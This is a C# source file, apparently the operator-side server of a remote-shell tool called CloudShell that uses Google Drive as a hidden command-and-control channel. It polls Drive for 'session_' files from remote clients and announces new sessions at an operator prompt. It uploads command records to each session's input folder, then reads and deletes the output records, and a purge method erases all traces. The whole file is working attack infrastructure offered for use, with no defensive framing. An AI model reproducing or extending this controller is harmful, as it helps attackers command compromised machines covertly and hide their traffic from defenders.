using Google.Apis.Drive.v2.Data;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CloudShell__Server
{
    class GoogleDriveSessionManager__Server : ISessionManager__Server
    {
        private Dictionary<string, Session> sessions_dictionary;
        private Session current_session = null;

        private GoogleDriveManager__Server gd_manager;
        public GoogleDriveSessionManager__Server(string serviceAccountEmail, string certificateBase64)
        {
            gd_manager = new GoogleDriveManager__Server(serviceAccountEmail, certificateBase64);
            sessions_dictionary = new Dictionary<string, Session>();
            StartSessionRefreshingThread();
        }

        public List<string> GetSessions()
        {
            List<string> sessions = new List<string>(sessions_dictionary.Keys);
            return sessions;
        }
        private void StartSessionRefreshingThread()
        {
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                while (true)
                {
                    RefreshSessions();
                    Thread.Sleep(5000);
                }
            }).Start();
        }
        private void RefreshSessions()
        {
            Dictionary<string, Session> new_sessions = new Dictionary<string, Session>();
            List<File> root_files = gd_manager.ListFiles("root");

            foreach (var file in root_files)
            {
                if (file.Title.StartsWith("session_")) {
                    Session s = new Session(gd_manager.GetFileContent(file));
                    new_sessions.Add(s.Identifier, s);
                }
            }

            foreach(var new_session in new_sessions.Keys) 
                if(!sessions_dictionary.Keys.Contains(new_session))
                {
                    Console.WriteLine();
                    Console.WriteLine("[+] new session: " + new_session);
                    Console.Write("> ");
                }


            sessions_dictionary.Clear();
            sessions_dictionary = new_sessions;
        }
        public void SetCurrentSession(string session_id)
        {
            if (sessions_dictionary.Keys.Contains(session_id))
            {
                current_session = sessions_dictionary[session_id];
            }
        }
        public string GetCurrentSession()
        {
            if (current_session != null)
                return current_session.Identifier;
            else
                return null;
        }
        public void UploadRecord(Record record)
        {
            File file = new File();
            file.Title = record.Name;
            file.Description = "Test";
            file.Parents = new List<ParentReference>() { new ParentReference() { Id = current_session.InputFolder } };

            gd_manager.CreateFile(file, record.ToString());
        }

        public List<Record> GetRecords()
        {
            List<Record> records = new List<Record>();
            List<File> files = gd_manager.ListFiles(current_session.OutputFolder);
            foreach(var file in files)
            {
                if (file.Title.StartsWith("record_"))
                {
                    records.Add(new Record(gd_manager.GetFileContent(file)));
                    gd_manager.DeleteFile(file);
                }
            }

            return records;
        }

        public void Purge()
        {
            gd_manager.PurgeAll();
        }
    }
}
